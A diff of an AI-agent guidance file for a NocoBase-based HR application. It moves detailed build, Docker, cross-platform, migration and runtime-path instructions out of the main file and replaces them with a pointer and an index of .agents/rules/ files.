-The `build` script sets `pnpm_config_strict_dep_builds=false` for `nocobase build`. `@nocobase/app-cli` writes `dist/pnpm-workspace.yaml` with its own `allowBuilds` list, dropping this application's `protobufjs: false`, and pnpm 11 stops the `dist/` install with `ERR_PNPM_IGNORED_BUILDS`; no build hook runs between writing that file and installing (`afterServerBuild` runs before it, `afterBuild` after). An `afterBuild` hook then copies the application's decisions into `dist/pnpm-workspace.yaml` (`cli/build-hooks/allow-builds.mjs`), so a later `pnpm install --prod` inside `dist/` works. Build hooks can only be declared by a CLI plugin entry, so `cli/build-hooks/index.ts` is a `defineCliPlugin` under the made-up name `@hr/build-hooks` registered in `cli/plugins.ts`; it is not a package and has no commands. Keep the variable in the script (the Dockerfile and Hub builds run it too) and the hook until app-cli carries the application's `allowBuilds`, and keep both when reconciling `package.json` and `cli/plugins.ts` on upgrade.
-
-**A compiled build runs as production by default.** `server/production-default.ts`, imported first by `server/standalone.ts` and `server/runtime.ts` (which the CLI loads), sets `NODE_ENV=production` when it is unset and the module is compiled `.js`; `pnpm dev`, the source CLI and Vitest load `.ts` and are unaffected. Every development-only switch (demo seeds, local-file mailbox, `/dev/*` routes such as `/api/talent/ai-entry/dev/im-mock*`, non-secure cookies) keys on `process.env.NODE_ENV === 'production'`; use that same check for new ones, and put every route of a development-only group inside one braced block. Set `NODE_ENV` in the process environment to run a build otherwise.
-
-**Production starts without the demo company.** `talent.companyName` (`TALENT_COMPANY_NAME`) is required in production — its validator is an error there and a warning elsewhere — and the business mailbox addresses (`businessMail.<purpose>.address`) default to empty; both fall back to the 启衡精密 demo's values (启衡精密科技, `<purpose>@qiheng.test`) only while `isDemoEnvironment` (`server/config/demo.ts`, the demo seeds' gate: not production and `HR_DEMO_SEED` not `false`) holds. The 设置 / 邮件 sender name defaults to 人力资源部; the demo's 启衡精密人力资源部 comes from the gated seed 202610160102. Public self-registration is off (`auth.emailAndPassword.disableSignUp: true` in `server/config/auth.ts`); the initial administrator, the directory sync and 开通账号 create accounts through the Users service and are unaffected, and nothing in the demo or tests registers through `/register`.
-
-### Building a Docker image
-
-`Dockerfile` and `Dockerfile.dockerignore` build this application from its sources: a build stage runs `pnpm install --frozen-lockfile` and `pnpm build`, and a `node:24-bookworm-slim` runtime stage receives `dist/` and `config.example.yml` only. The runtime has no pnpm, so it runs the two `dist/package.json` scripts directly: `start` is `node ./server/standalone.js`, which the image starts as `node dist/server/standalone.js`, and `nocobase` is `node ./cli/index.js`, run as `node dist/cli/index.js <topic> <command>`. The deployment root is `/app`, so configuration is `/app/config.yml` and storage is `/app/storage`, both mounted at runtime.
-
-The client is not tied to a mount path, so `APP_BASE_PATH` is a runtime variable, `/main` in the image unless the container is started with `-e APP_BASE_PATH=<path>`; the health check probes the same path. The build stage runs on `$BUILDPLATFORM` and passes `--target linux-$TARGETARCH`, so a multi-platform build does not compile under emulation; do not move the build stage to the target platform or switch the runtime to Alpine, which would need the musl target. Keep `Dockerfile.dockerignore` beside the Dockerfile: BuildKit reads it only there, and without it `config.yml`, `.env`, and `storage/` enter the build context.
-
-`--build-arg DIST=prebuilt` skips the build stage and packages the `dist/` in the context instead, selected through `FROM dist-${DIST}` so BuildKit never runs the stage it does not use. That stage refuses a `dist/` whose `nocobase.buildTarget` is not linux, glibc, the target architecture and the image's Node major, and one from an `@nocobase/app-cli` that does not record `nocobase.relocatable`, whose client is tied to the path it was built for. The ignore file re-includes `dist/` last and whole, so dependency directories inside it named like excluded paths (`langchain/storage`) survive, and then excludes `dist/.env`, which can carry `DB_PASSWORD` from local `.env` files. Keep those rules in that order.
-
-### Building for another platform
-
-`pnpm build --help` (or `-h`) lists build options and exits without loading build dependencies, running hooks, or modifying `dist/`. Every successful build records `nocobase.buildTarget` in `dist/package.json`, including builds with no native modules: `platform`, `arch`, `libc`, `nodeMajor`, and `nodeAbi`. Use `libc` only for Linux; its value on other platforms is a compatibility placeholder. Deployment checks should compare these fields with the host runtime and also respect `engines.node`. With `--target current` (the default), the Node version and ABI come from the running process; an explicit platform target defaults to Node 24 unless `--node-version` is supplied.
-
-`pnpm build` targets the machine it runs on, so `pnpm build && pnpm start` works. A deployment build says where it is going: `--target linux-x64`, `--target linux-arm64`, `--target linux-x64-musl`, plus `--node-version` when the server's Node major differs. Every build prints the platform it produced and records it in `dist/package.json` under `nocobase.buildTarget`.
-
-A `.node` binary must match the target platform, architecture, and C library; addons using the Node ABI must also match its version. `better-sqlite3` 13 uses N-API and bundles its platform binaries, so cross-platform builds retain the target's binary, including the separate `linuxmusl` build for Alpine. `pg`, `mysql2`, and `tedious` are plain JavaScript, so an application using only those is portable as built.
-
-### When a build or a deployment fails
-
-| Symptom                                                                                 | Cause                                                                        | Fix                                                                                                                                                                                  |
-| --------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
-| `Cannot find module 'x'` on the server, works locally                                   | `x` is in `devDependencies`, which `dist/package.json` is not generated from | Move it to `dependencies`                                                                                                                                                            |
-| A browser package will not resolve while building the application                       | A plugin declares it as a peer and nothing provides it                       | Add it to the application's `devDependencies`                                                                                                                                        |
-| `Error loading shared library`, `invalid ELF header`, or a bare `.node` path at startup | The binary does not match the server                                         | Compare `require('./dist/package.json').nocobase.buildTarget` with the server's `process.platform`, `process.arch`, and `process.versions.modules`, then rebuild with matching flags |
-| `no prebuilt binary for <target>` during the build                                      | The package publishes no build for that combination                          | Check the package supports the target; musl coverage is thinner than glibc                                                                                                           |
-
-Node ABI to major version: 115 is Node 20, 127 is 22, 137 is 24, 147 is 26.
-
-## Before you finish
-
-For each change, scope all verification to the affected files, projects, or packages and their affected consumers. This applies to formatting, lint, type checking, tests, builds, and runtime verification. Run only the checks relevant to the change: use explicit file paths for formatting, lint, and tests; use the owning project's TypeScript configuration for type checking; build only affected packages or supported build targets. In a workspace, use `pnpm --filter <affected-package> <script>`. In a standalone application, use its supported file or project selectors; do not invent flags or bypass project configuration to force a narrower check.
-
-Do not run full-application or workspace-wide checks, or an aggregate `pnpm check`, as a routine step after each edit. If a necessary check cannot be narrowed further, run the smallest supported project or package scope and explain why. Expand scope only when shared code, dependencies, configuration, or a failure gives a concrete reason, or when the user explicitly requests it. After checks pass, repeat them only for further relevant changes or unresolved failures. Documentation-only changes need formatting and link checks for the changed documents, not type checking, runtime tests, or builds.
-
-Report which checks ran, their scope, and any unverified behavior. See the application development Skill's `references/testing.md` for selection examples.
-
-Add tests for what you changed: a route's authenticated, unauthenticated, and unauthorized responses; a migration's `up` and `down` against a real database; a page's actual behavior. Tests belong in `tests/`, or in `e2e/` when they need a real server. Never place a test beside the source it covers.
-
-For any UI work, start with `.agents/skills/nocobase-app-development/references/frontend/ui-workflow.md` (from the application root), which decides the workflow and routes to the rest. Its styling rules are in `references/styling.md` beside it: which semantic Tailwind utilities to use so components respond to theme changes, and how to keep deliberate fixed-size exceptions explicit. The full color, font, size, spacing, radius and shadow token contract, and creating or editing theme presets, are in `references/theme.md`.
-
-Application startup defaults belong in `config.yml`: `i18n.defaultLocale` for the language, and `client.app.defaultColorScheme` and `client.app.defaultTheme` for appearance. Valid browser-local choices take precedence. Which languages the application offers is not configured — its own `client/locales/` and `server/locales/` are that list. See the i18n and themes references.
-
-## Compiled migration and seed manifests
-
-The application build generates `.manifest.json` in each compiled migrations and seeds directory after server compilation, path rewriting, and `afterServerBuild` hooks. Keep the manifest generator in the build when customizing it. Plugins generate their own manifests when built; an application must not regenerate manifests for installed dependencies.
-
-TypeScript and compiled JavaScript use the same source checksum for migration history, while the loader separately verifies emitted JavaScript. Marked JavaScript requires its manifest. For a database with old raw JavaScript checksums, first run the compiled representation with matching original output; verified legacy hashes are converted under the task lock. Unreproducible old output remains an error. Never edit historical migrations, and never edit the history table by hand, to resolve an upgrade failure; `pnpm nocobase db repair` is the supported way to realign a checksum you can account for, and `pnpm nocobase db redo` the way to re-run a migration whose branch is still unmerged.
-
-The account menu checks Better Auth sign-out results before refreshing the session and shows a localized error toast for API or network failures. Preserve this behavior when upgrading the shell; navigation alone does not revoke a session.
-
-The authorization provider clears the permission snapshot before rendering a new session. Route navigation and page guards subscribe to the authorization revision; preserve these checks when customizing the shell so account changes and permission updates take effect without a reload. Pending checks hide protected content, and failed checks deny access.
-
-Navigation groups retain their expanded or collapsed state while the navigation tree stays mounted. Selecting a new page expands its ancestor groups without collapsing other groups; users can still collapse the active group manually. Keep this behavior aligned across the application, Settings, and Dev tools navigation.
-
-## Development logging
-
-`pnpm dev` owns the ready banner and public URL; `APP_SERVER_START_LOG=false` suppresses the underlying listener announcement through the `env` of `server/config/server.ts`. Keep that mapping when editing deployment environment settings. Request starts, request headers and config diagnostics use DEBUG; the normal INFO output contains completion summaries. See the shared application development Skill for hosted logging and upgrade limits.
-
-## Runtime paths and application creation
-
-`runtime.paths`, configuration context `paths`, and `app.paths` share one resolved `AppPaths` object. Use `paths.storage('...')`, `paths.database('...')`, or the corresponding directory fields. `AppPathOptions` is input only; application path policies run before the final object is created and configuration is loaded. Standalone entries declare the deployment root in `server/runtime.ts` so the server and CLI share persistent storage outside the compiled code directory.
-
-`server/app.ts` calls `createAppFromRuntime(runtime)` to transfer configuration, paths, mode and Host logging policy and bind `runtime.app`. Keep Provider, middleware and route registration explicit and ordered; `startApplicationInScope` owns startup and shutdown binding.
+- Record what the next agent needs to know in the matching `.agents/rules/` file, or a new one linked from the index below, so the guidance describes the application as it actually is without growing this file. If the framework's shared guidance is wrong for every application, update the source `@nocobase/app-skills` package instead of editing its synchronized copy.
+
+## Index
+
+| Read                                                                   | When                                                                                                                |
+| ---------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------- |
+| [.agents/rules/native-ai.md](.agents/rules/native-ai.md)               | Changing native AI models, employee chat, learning-plan generation or remaining assistant callers                   |
+| [.agents/rules/nocohr-retained.md](.agents/rules/nocohr-retained.md)   | Preserving NocoHR business logic, permissions, mail, AI, mobile navigation, headers and custom application behavior |
+| [.agents/rules/components.md](.agents/rules/components.md)             | Adding or changing a component, a shadcn primitive, a UI Library item, or the visual design                         |
+| [.agents/rules/shell.md](.agents/rules/shell.md)                       | Changing layouts, the header, sidebar, breadcrumbs, the account menu or loading indicators                          |
+| [.agents/rules/build-and-deploy.md](.agents/rules/build-and-deploy.md) | Changing the build, packing a deployment, the Docker image, `CDN_BASE_URL`, or building for another platform        |
